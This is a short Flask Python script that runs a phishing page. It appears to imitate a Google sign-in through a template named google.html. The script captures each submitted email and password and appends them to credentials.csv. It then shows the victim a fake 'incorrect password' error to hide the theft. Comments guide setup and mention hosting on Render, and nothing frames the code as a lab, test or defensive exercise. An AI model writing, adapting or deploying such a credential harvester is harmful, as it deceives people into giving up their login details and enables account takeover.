from flask import Flask, request, render_template
import csv
import os

# Initialize the Flask application
app = Flask(__name__)

# Define the file where credentials will be stored
CREDENTIALS_FILE = 'credentials.csv'

@app.route('/', methods=['GET', 'POST'])
def login():
    # This function runs when someone visits your site
    
    if request.method == 'POST':
        # This block runs when the login form is submitted
        
        # Get the username and password from the form
        # Make sure your HTML <input> tags have name="username" and name="password"
        username = request.form.get('email')
        password = request.form.get('password')
        
        # Save the credentials to the CSV file
        with open(CREDENTIALS_FILE, 'a', newline='') as f:
            writer = csv.writer(f)
            # Write a new row with the captured credentials
            writer.writerow([username, password])
            
        # After saving, show a fake error message to the user
        error_message = "The username or password you entered is incorrect. Please try again."
        return render_template('google.html', error=error_message)
    
    # If it's a GET request, just show the login page
    return render_template('index.html')

if __name__ == "__main__":
    # Start the web server
    # It will be accessible on your local machine
    port = int(os.environ.get("PORT", 5000))  # Render sets PORT automatically
    app.run(host="0.0.0.0", port=port, debug=True)
